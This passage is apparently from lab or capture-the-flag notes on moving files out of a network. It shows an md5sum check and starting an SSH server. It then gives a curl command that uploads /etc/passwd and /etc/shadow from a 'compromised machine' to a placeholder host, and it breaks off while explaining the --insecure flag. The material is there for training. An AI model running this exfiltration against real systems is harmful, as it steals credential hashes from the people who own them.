...
Check File MD5 Hash -> md5sum <file> 
...
```
Starting the SSH server: sudo systemctl start ssh
...
```
From Compromised machine: upload the /etc/passwd and /etc/shadow files:

(Multiple Files):
curl -X POST http://MACHINE_IP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```'
We used the option `--insecure` because we used a self-signed certificate that we trus
